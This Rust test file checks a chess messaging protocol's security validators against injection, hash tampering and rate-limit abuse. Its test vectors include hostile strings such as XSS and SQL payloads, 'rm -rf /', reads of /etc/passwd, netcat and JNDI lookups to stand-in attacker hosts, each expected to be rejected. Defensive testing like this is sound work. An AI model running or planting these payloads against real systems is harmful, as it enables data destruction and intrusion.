//! Chess Security Integration Tests
//!
//! This module tests security measures in realistic attack scenarios for the chess message protocol.
//! It covers:
//! - Attack simulation: Injection attacks, tampering attempts, rate limit violations
//! - Security pipeline integration: End-to-end security validation
//! - Performance impact: Security overhead measurement
//! - Compliance verification: Security standard compliance testing
//!
//! Key focus areas:
//! - Real-world attack resistance
//! - Security vs performance trade-offs
//! - Comprehensive security coverage
//! - Audit trail and monitoring capabilities

use mate::chess::{Board, Color};
use mate::messages::chess::{
    generate_game_id, hash_board_state,
    security::{
        validate_message_security, validate_safe_text_input, validate_secure_board_hash,
        validate_secure_chess_move, validate_secure_fen_notation, validate_secure_game_id,
        validate_secure_move_history, validate_secure_reason_text, ChessRateLimitConfig,
        ChessRateLimiter, SecurityViolation, MAX_FEN_LENGTH, MAX_MOVE_HISTORY_SIZE,
        MAX_MOVE_NOTATION_LENGTH, MAX_REASON_LENGTH,
    },
    GameAccept, GameDecline, GameInvite, Move, MoveAck, SyncRequest, SyncResponse,
};
use mate::messages::types::Message;

use std::time::{Duration, Instant};

// Helper function to detect CI environment and adjust performance expectations
fn is_ci_environment() -> bool {
    std::env::var("CI").is_ok()
        || std::env::var("GITHUB_ACTIONS").is_ok()
        || std::env::var("TRAVIS").is_ok()
        || std::env::var("CIRCLECI").is_ok()
        || std::env::var("JENKINS_URL").is_ok()
}

fn get_performance_multiplier() -> u32 {
    if is_ci_environment() {
        // Be more lenient in CI environments
        10
    } else if cfg!(debug_assertions) {
        // Debug builds are slower
        5
    } else {
        // Release builds on local machines
        1
    }
}

#[cfg(test)]
mod attack_simulation_tests {
    use super::*;

    #[test]
    fn test_injection_attack_simulation() {
        println!("Testing comprehensive injection attack patterns");

        // Common injection patterns that should be detected
        let injection_patterns = vec![
            // XSS patterns
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "onload=alert(1)",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            // SQL injection patterns
            "'; DROP TABLE games; --",
            "1' OR '1'='1",
            "admin'/*",
            "UNION SELECT password FROM users",
            // Command injection patterns
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(cat /etc/passwd)",
            // Path traversal patterns
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            // Template injection patterns
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",
            "<%= system('id') %>",
            "#{7*7}",
            // Binary/control character injection
            "test\x00payload",
            "test\x01\x02\x03",
            "test\r\ninjected: header",
            // Unicode/encoding attacks
            "test\u{0000}payload",
            "test%00payload",
            "test\u{FEFF}payload",
        ];

        let game_id = generate_game_id();

        // Test each injection pattern against all relevant validation functions
        for pattern in injection_patterns {
            // Test game ID validation (should reject non-UUID patterns)
            if !pattern.contains('-') || pattern.len() != 36 {
                assert!(
                    validate_secure_game_id(pattern).is_err(),
                    "Game ID validation should reject injection pattern: {}",
                    pattern
                );
            }

            // Test chess move validation
            assert!(
                validate_secure_chess_move(pattern, &game_id).is_err(),
                "Chess move validation should reject injection pattern: {}",
                pattern
            );

            // Test reason text validation
            assert!(
                validate_secure_reason_text(pattern).is_err(),
                "Reason text validation should reject injection pattern: {}",
                pattern
            );

            // Test safe text input validation
            assert!(
                validate_safe_text_input(pattern, "test_field", 1000).is_err(),
                "Safe text validation should reject injection pattern: {}",
                pattern
            );

            // Test FEN notation validation
            assert!(
                validate_secure_fen_notation(pattern).is_err(),
                "FEN validation should reject injection pattern: {}",
                pattern
            );
        }

        println!("✓ All injection patterns were properly detected and rejected");
    }

    #[test]
    fn test_board_tampering_attack_simulation() {
        println!("Testing board state tampering detection");

        let game_id = generate_game_id();
        let board = Board::new();
        let legitimate_hash = hash_board_state(&board);

        // Various tampering scenarios
        let last_char = &legitimate_hash[..63];
        let first_char = &legitimate_hash[1..];
        let tampering_attempts = vec![
            // Modified hash values
            "a".repeat(64),                         // Wrong hash content
            legitimate_hash[1..].to_string() + "a", // Single character change
            legitimate_hash.to_uppercase(),         // Case change
            format!("{last_char}x"),                // Last character changed
            format!("x{first_char}"),               // First character changed
            // Length attacks
            legitimate_hash[..32].to_string(), // Truncated hash
            format!("{legitimate_hash}extra"), // Extended hash
            String::new(),                     // Empty hash
            "x".repeat(32),                    // Too short
            "x".repeat(128),                   // Too long
            // Format attacks
            "not-a-hex-hash-at-all".to_string(),
            "g".repeat(64), // Invalid hex characters
            "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz".to_string(),
            // Special character attacks
            format!("{legitimate_hash}}}"), // Added delimiter (escaped brace)
            format!("'{legitimate_hash}'"), // Quoted hash
            format!("{legitimate_hash}--"), // SQL comment suffix
        ];

        for tampered_hash in tampering_attempts {
            let result = validate_secure_board_hash(&game_id, &board, &tampered_hash, "test");

            if tampered_hash == legitimate_hash {
                assert!(result.is_ok(), "Legitimate hash should validate");
            } else {
                assert!(
                    result.is_err(),
                    "Tampering should be detected for hash: {}",
                    tampered_hash
                );

                // Verify we get the right type of error
                if let Err(SecurityViolation::BoardTampering { .. }) = result {
                    // Expected for hash mismatches
                } else if let Err(SecurityViolation::CryptographicFailure { .. }) = result {
                    // Expected for format violations
                } else {
                    panic!("Unexpected error type for tampering attempt: {:?}", result);
                }
            }
        }

        println!("✓ Board tampering detection working correctly");
    }

    #[test]
    fn test_rate_limit_violation_attacks() {
        println!("Testing rate limit violation attack scenarios");

        let strict_config = ChessRateLimitConfig {
            max_moves_per_minute: 5,
            max_invitations_per_hour: 3,
            max_sync_requests_per_minute: 2,
            max_active_games: 2,
            burst_moves_allowed: 2,
            burst_window_seconds: 10,
        };

        let mut limiter = ChessRateLimiter::new(strict_config);

        // Simulate rapid-fire move attack
        let game_id = "test-game-1";
        let mut move_count = 0;

        // First few moves should be allowed
        for i in 0..2 {
            assert!(
                limiter.check_move_rate_limit(game_id),
                "Move {} should be allowed within burst limit",
                i
            );
            move_count += 1;
        }

        // Additional rapid moves should be blocked (burst limit exceeded)
        for i in 2..10 {
            if !limiter.check_move_rate_limit(game_id) {
                println!("Move {} blocked - rate limit protection activated", i);
                break;
            }
            move_count += 1;
        }

        // Should have been blocked before completing all 10 moves
        assert!(
            move_count < 10,
            "Rate limiting should have blocked some moves"
        );

        // Simulate invitation spam attack
        let attacker_id = "attacker-1";
        let mut invitation_count = 0;

        for i in 0..10 {
            if limiter.check_invitation_rate_limit(attacker_id) {
                invitation_count += 1;
            } else {
                println!("Invitation {} blocked - spam protection activated", i);
                break;
            }
        }

        assert!(
            invitation_count <= 3,
            "Should block invitations after limit reached"
        );

        // Simulate sync request flooding
        let sync_game_id = "sync-game-1";
        let mut sync_count = 0;

        for i in 0..10 {
            if limiter.check_sync_rate_limit(sync_game_id) {
                sync_count += 1;
            } else {
                println!("Sync request {} blocked - flooding protection activated", i);
                break;
            }
        }

        assert!(
            sync_count <= 2,
            "Should block sync requests after limit reached"
        );

        println!("✓ Rate limiting protection working correctly");
    }

    #[test]
    fn test_coordinated_multi_vector_attack() {
        println!("Testing coordinated attack with multiple attack vectors");

        let game_id = generate_game_id();
        let malicious_messages = vec![
            // Game invite with injection in suggested color handling
            Message::GameInvite(GameInvite::new(
                "not-a-uuid-<script>alert(1)</script>".to_string(),
                Some(Color::White),
            )),
            // Game decline with XSS in reason
            Message::GameDecline(GameDecline::new_with_reason(
                game_id.clone(),
                "<img src=x onerror=alert('xss')>".to_string(),
            )),
            // Chess move with SQL injection attempt
            Message::Move(Move::new(
                game_id.clone(),
                "'; DROP TABLE games; --".to_string(),
                "tampered_hash_value".to_string(),
            )),
            // Sync response with malicious FEN and move history
            Message::SyncResponse(SyncResponse::new(
                game_id.clone(),
                "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR\x00w KQkq - 0 1".to_string(),
                vec!["e2e4\0".to_string(), "${jndi:exploit}".to_string()],
                "malicious_board_hash".to_string(),
            )),
        ];

        // Each malicious message should be caught by security validation
        for (i, message) in malicious_messages.iter().enumerate() {
            let result = validate_message_security(message);
            assert!(
                result.is_err(),
                "Malicious message {} should be rejected: {:?}",
                i,
                message.message_type()
            );

            // Verify we get appropriate security violation types
            match result {
                Err(SecurityViolation::InjectionAttempt { .. })
                | Err(SecurityViolation::CryptographicFailure { .. })
                | Err(SecurityViolation::SuspiciousPattern { .. })
                | Err(SecurityViolation::BoardTampering { .. }) => {
                    // Expected security violations
                }
                Err(other) => {
                    panic!("Unexpected security violation type: {:?}", other);
                }
                Ok(_) => {
                    panic!("Malicious message should have been rejected");
                }
            }
        }

        println!("✓ Multi-vector attack properly detected and blocked");
    }
}

#[cfg(test)]
mod security_pipeline_integration_tests {
    use super::*;

    #[test]
    fn test_end_to_end_security_validation_pipeline() {
        println!("Testing complete security validation pipeline");

        // Test valid message passes through entire pipeline
        let valid_game_id = generate_game_id();
        let board = Board::new();
        let valid_hash = hash_board_state(&board);

        let valid_message = Message::Move(Move::new(
            valid_game_id.clone(),
            "e2e4".to_string(),
            valid_hash,
        ));

        // Should pass all validation stages
        assert!(validate_message_security(&valid_message).is_ok());
        assert!(valid_message.validate().is_ok());

        // Test message with security violations is caught at each stage
        let malicious_message = Message::Move(Move::new(
            "malicious<script>".to_string(),       // Invalid game ID
            "'; DROP TABLE moves; --".to_string(), // SQL injection in move
            "tampered_hash".to_string(),           // Invalid hash
        ));

        // Should fail security validation
        assert!(validate_message_security(&malicious_message).is_err());
        assert!(malicious_message.validate().is_err());

        println!("✓ Security validation pipeline working correctly");
    }

    #[test]
    fn test_security_error_propagation() {
        println!("Testing security error propagation through validation chain");

        let test_cases = vec![
            (
                "Game ID security violation",
                Message::GameInvite(GameInvite::new("not-a-uuid".to_string(), None)),
                "CryptographicFailure",
            ),
            (
                "Chess move injection attempt",
                Message::Move(Move::new(
                    generate_game_id(),
                    "<script>alert(1)</script>".to_string(),
                    hash_board_state(&Board::new()),
                )),
                "InjectionAttempt",
            ),
            (
                "Reason text too long",
                Message::GameDecline(GameDecline::new_with_reason(
                    generate_game_id(),
                    "x".repeat(1000), // Exceeds MAX_REASON_LENGTH
                )),
                "FieldTooLong",
            ),
        ];

        for (test_name, message, expected_error_type) in test_cases {
            let result = validate_message_security(&message);
            assert!(
                result.is_err(),
                "{} should fail security validation",
                test_name
            );

            // Check that the error type matches expectations
            let error = result.unwrap_err();
            let error_type_matches = matches!(
                (&error, expected_error_type),
                (
                    SecurityViolation::CryptographicFailure { .. },
                    "CryptographicFailure"
                ) | (
                    SecurityViolation::InjectionAttempt { .. },
                    "InjectionAttempt"
                ) | (SecurityViolation::FieldTooLong { .. }, "FieldTooLong")
            );

            assert!(
                error_type_matches,
                "{}: Expected {} error, got {:?}",
                test_name, expected_error_type, error
            );

            // Test that error propagates through message validation
            let validation_result = message.validate();
            assert!(
                validation_result.is_err(),
                "{} should fail message validation",
                test_name
            );
        }

        println!("✓ Security error propagation working correctly");
    }

    #[test]
    fn test_security_boundary_validation() {
        println!("Testing security validation at system boundaries");

        // Test exactly at security limits
        let boundary_tests = vec![
            (
                "Reason at exact max length",
                validate_secure_reason_text(&"x".repeat(MAX_REASON_LENGTH)),
                true,
            ),
            (
                "Reason over max length",
                validate_secure_reason_text(&"x".repeat(MAX_REASON_LENGTH + 1)),
                false,
            ),
            (
                "Move at exact max length",
                validate_secure_chess_move(&"x".repeat(MAX_MOVE_NOTATION_LENGTH), "test"),
                false, // Even max length should fail format validation
            ),
            (
                "FEN at exact max length",
                validate_secure_fen_notation(&"x".repeat(MAX_FEN_LENGTH)),
                false, // Should fail format validation
            ),
        ];

        for (test_name, result, should_pass) in boundary_tests {
            if should_pass {
                assert!(result.is_ok(), "{} should pass", test_name);
            } else {
                assert!(result.is_err(), "{} should fail", test_name);
            }
        }

        // Test move history boundary
        let max_history: Vec<String> = (0..MAX_MOVE_HISTORY_SIZE)
            .map(|i| format!("e{start}e{end}", start = (i % 8) + 1, end = (i % 8) + 2))
            .collect();

        assert!(validate_secure_move_history(&max_history).is_err()); // Should fail due to invalid moves

        let over_max_history: Vec<String> = (0..MAX_MOVE_HISTORY_SIZE + 1)
            .map(|_| "e2e4".to_string())
            .collect();

        assert!(validate_secure_move_history(&over_max_history).is_err());

        println!("✓ Security boundary validation working correctly");
    }
}

#[cfg(test)]
mod performance_impact_tests {
    use super::*;

    #[test]
    fn test_security_validation_performance_overhead() {
        println!("Testing security validation performance overhead");

        let game_id = generate_game_id();
        let board = Board::new();
        let hash = hash_board_state(&board);

        let test_message = Message::Move(Move::new(game_id, "e2e4".to_string(), hash));

        // Measure baseline message validation time
        let baseline_start = Instant::now();
        for _ in 0..1000 {
            let _ = test_message.validate();
        }
        let baseline_duration = baseline_start.elapsed();

        // Measure security-only validation time
        let security_start = Instant::now();
        for _ in 0..1000 {
            let _ = validate_message_security(&test_message);
        }
        let security_duration = security_start.elapsed();

        println!(
            "Baseline validation: {:?} for 1000 iterations",
            baseline_duration
        );
        println!(
            "Security validation: {:?} for 1000 iterations",
            security_duration
        );

        // Security validation should not add excessive overhead
        // Allow security validation to take up to 10x longer than baseline, but it should still be fast
        let multiplier = get_performance_multiplier();
        let max_duration_ms = 100 * multiplier;
        assert!(
            security_duration < Duration::from_millis(max_duration_ms as u64),
            "Security validation taking too long: {:?} (max: {}ms, multiplier: {}x)",
            security_duration,
            max_duration_ms,
            multiplier
        );

        println!("✓ Security validation performance within acceptable limits");
    }

    #[test]
    fn test_rate_limiter_memory_efficiency() {
        println!("Testing rate limiter memory efficiency under load");

        let config = ChessRateLimitConfig::default();
        let mut limiter = ChessRateLimiter::new(config);

        // Simulate high-volume usage
        let start_time = Instant::now();

        // Generate many game/player IDs to test memory usage
        for i in 0..10000 {
            let game_id = format!("game-{i}");
            let temp_id = i % 100;
            let player_id = format!("player-{temp_id}"); // Reuse some player IDs

            limiter.check_move_rate_limit(&game_id);
            limiter.check_invitation_rate_limit(&player_id);
            limiter.check_sync_rate_limit(&game_id);

            // Periodically cleanup to test cleanup efficiency
            if i % 1000 == 0 {
                limiter.cleanup_old_data();
            }
        }

        let duration = start_time.elapsed();
        println!("Processed 10,000 rate limit checks in {:?}", duration);

        // Final cleanup
        limiter.cleanup_old_data();

        // This test primarily ensures the rate limiter doesn't crash or hang
        // under high load and that cleanup works properly
        assert!(
            duration < Duration::from_secs(5),
            "Rate limiting taking too long"
        );

        println!("✓ Rate limiter memory efficiency acceptable");
    }

    #[test]
    fn test_security_validation_scalability() {
        println!("Testing security validation scalability with complex inputs");

        // Test with increasingly complex inputs
        let complexity_levels = vec![
            ("Simple", "e2e4", "simple reason".to_string()),
            ("Medium", "O-O-O", "a".repeat(100)),
            ("Complex", "Nf3+", "a".repeat(MAX_REASON_LENGTH)),
        ];

        for (level, chess_move, reason) in complexity_levels {
            let game_id = generate_game_id();
            let board = Board::new();
            let hash = hash_board_state(&board);

            let message =
                Message::GameDecline(GameDecline::new_with_reason(game_id.clone(), reason));

            let start = Instant::now();
            for _ in 0..100 {
                let _ = validate_message_security(&message);
                let _ = validate_secure_chess_move(chess_move, &game_id);
                let _ = validate_secure_board_hash(&game_id, &board, &hash, "test");
            }
            let duration = start.elapsed();

            println!("{} validation: {:?} for 100 iterations", level, duration);

            // Even complex validation should be reasonably fast
            // Note: CI environments may have different performance characteristics
            let multiplier = get_performance_multiplier();
            let max_duration_ms = 50 * multiplier;
            let max_duration = Duration::from_millis(max_duration_ms as u64);
            assert!(
                duration < max_duration,
                "{} validation too slow: {:?} (max: {:?}, multiplier: {}x)",
                level,
                duration,
                max_duration,
                multiplier
            );
        }

        println!("✓ Security validation scales well with input complexity");
    }
}

#[cfg(test)]
mod compliance_verification_tests {
    use super::*;

    #[test]
    fn test_cryptographic_standards_compliance() {
        println!("Testing compliance with cryptographic standards");

        // Test UUID v4 compliance
        for _ in 0..100 {
            let game_id = generate_game_id();

            // Should pass secure validation
            assert!(
                validate_secure_game_id(&game_id).is_ok(),
                "Generated game ID should be cryptographically secure: {}",
                game_id
            );

            // Parse as UUID to verify structure
            let uuid =
                uuid::Uuid::parse_str(&game_id).expect("Generated game ID should be valid UUID");

            // Verify it's UUID v4 (random)
            assert_eq!(
                uuid.get_version(),
                Some(uuid::Version::Random),
                "Generated UUID should be version 4 (random)"
            );

            // Verify it's not nil
            assert!(!uuid.is_nil(), "Generated UUID should not be nil");
        }

        // Test hash algorithm compliance (SHA-256)
        let board = Board::new();
        let hash = hash_board_state(&board);

        // SHA-256 hashes should be exactly 64 hex characters
        assert_eq!(hash.len(), 64, "Board hash should be 64 characters");
        assert!(
            hash.chars().all(|c| c.is_ascii_hexdigit()),
            "Board hash should be valid hex: {}",
            hash
        );

        // Hash should be consistent
        let hash2 = hash_board_state(&board);
        assert_eq!(hash, hash2, "Board hashes should be deterministic");

        println!("✓ Cryptographic standards compliance verified");
    }

    #[test]
    fn test_input_validation_standards_compliance() {
        println!("Testing compliance with input validation standards");

        // Test defense against OWASP Top 10 injection types
        let owasp_injection_patterns = vec![
            // A03:2021 – Injection
            "<script>alert(1)</script>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://attacker.com/exp}",
            "../../../etc/passwd",
            "{{7*7}}",
            // Common XSS patterns
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "data:text/html,<script>alert(1)</script>",
            // SQL injection variants
            "1' OR '1'='1",
            "admin'/*",
            "UNION SELECT * FROM users",
            "1'; EXEC sp_configure 'show advanced options', 1--",
            // Command injection
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            "`id`",
            "$(whoami)",
            // Template injection
            "#{7*7}",
            "<%= system('id') %>",
            "{{config}}",
            "${7*7}",
        ];

        for pattern in owasp_injection_patterns {
            // Should be caught by safe text input validation
            assert!(
                validate_safe_text_input(pattern, "test_field", 1000).is_err(),
                "OWASP injection pattern should be detected: {}",
                pattern
            );

            // Should be caught by specific field validations
            assert!(
                validate_secure_reason_text(pattern).is_err(),
                "Injection in reason field should be detected: {}",
                pattern
            );

            assert!(
                validate_secure_chess_move(pattern, "test-game").is_err(),
                "Injection in chess move should be detected: {}",
                pattern
            );
        }

        println!("✓ Input validation standards compliance verified");
    }

    #[test]
    fn test_security_audit_trail_compliance() {
        println!("Testing security audit trail and monitoring compliance");

        // Test that security violations are properly categorized
        let violation_types = vec![
            SecurityViolation::InjectionAttempt {
                field: "test".to_string(),
                content: "malicious".to_string(),
            },
            SecurityViolation::FieldTooLong {
                field: "test".to_string(),
                length: 1000,
                max_length: 500,
            },
            SecurityViolation::RateLimitExceeded {
                operation: "move".to_string(),
                limit: "5 per minute".to_string(),
            },
            SecurityViolation::CryptographicFailure {
                reason: "Invalid UUID".to_string(),
            },
            SecurityViolation::SuspiciousPattern {
                field: "test".to_string(),
                pattern: "control chars".to_string(),
            },
            SecurityViolation::BoardTampering {
                game_id: "test-game".to_string(),
                expected_hash: "expected".to_string(),
                actual_hash: "actual".to_string(),
            },
        ];

        for violation in violation_types {
            // Each violation should have clear, structured display
            let display_msg = format!("{violation}");
            assert!(
                !display_msg.is_empty(),
                "Security violation should have display message"
            );

            // Display should be informative but not reveal sensitive data
            assert!(
                !display_msg.contains("password"),
                "Security violation display should not leak sensitive data"
            );

            // Should be categorized appropriately
            match violation {
                SecurityViolation::InjectionAttempt { .. } => {
                    assert!(display_msg.contains("injection"));
                }
                SecurityViolation::FieldTooLong { .. } => {
                    assert!(display_msg.contains("too long"));
                }
                SecurityViolation::RateLimitExceeded { .. } => {
                    assert!(display_msg.contains("Rate limit"));
                }
                SecurityViolation::CryptographicFailure { .. } => {
                    assert!(display_msg.contains("Cryptographic"));
                }
                SecurityViolation::SuspiciousPattern { .. } => {
                    assert!(display_msg.contains("Suspicious"));
                }
                SecurityViolation::BoardTampering { .. } => {
                    assert!(display_msg.contains("tampering"));
                }
            }
        }

        println!("✓ Security audit trail compliance verified");
    }

    #[test]
    fn test_comprehensive_security_coverage() {
        println!("Testing comprehensive security coverage across all message types");

        let game_id = generate_game_id();
        let board = Board::new();
        let valid_hash = hash_board_state(&board);

        // Test that all chess message types have security validation
        let message_types = vec![
            (
                "GameInvite",
                Message::GameInvite(GameInvite::new(game_id.clone(), Some(Color::White))),
            ),
            (
                "GameAccept",
                Message::GameAccept(GameAccept::new(game_id.clone(), Color::Black)),
            ),
            (
                "GameDecline",
                Message::GameDecline(GameDecline::new_with_reason(
                    game_id.clone(),
                    "test".to_string(),
                )),
            ),
            (
                "Move",
                Message::Move(Move::new(
                    game_id.clone(),
                    "e2e4".to_string(),
                    valid_hash.clone(),
                )),
            ),
            (
                "MoveAck",
                Message::MoveAck(MoveAck::new_with_move_id(
                    game_id.clone(),
                    "move-1".to_string(),
                )),
            ),
            (
                "SyncRequest",
                Message::SyncRequest(SyncRequest::new(game_id.clone())),
            ),
            (
                "SyncResponse",
                Message::SyncResponse(SyncResponse::new(
                    game_id.clone(),
                    board.to_fen(),
                    vec!["e2e4".to_string()],
                    valid_hash,
                )),
            ),
        ];

        for (msg_type, message) in message_types {
            // Valid messages should pass security validation
            assert!(
                validate_message_security(&message).is_ok(),
                "{} valid message should pass security validation",
                msg_type
            );

            // Each message type should be subject to security validation
            assert!(
                message.validate().is_ok(),
                "{} valid message should pass full validation",
                msg_type
            );
        }

        // Non-chess messages should not be subject to chess security validation
        let ping_message = Message::new_ping(42, "test".to_string());
        assert!(validate_message_security(&ping_message).is_ok());

        println!("✓ Comprehensive security coverage verified for all message types");
    }
}
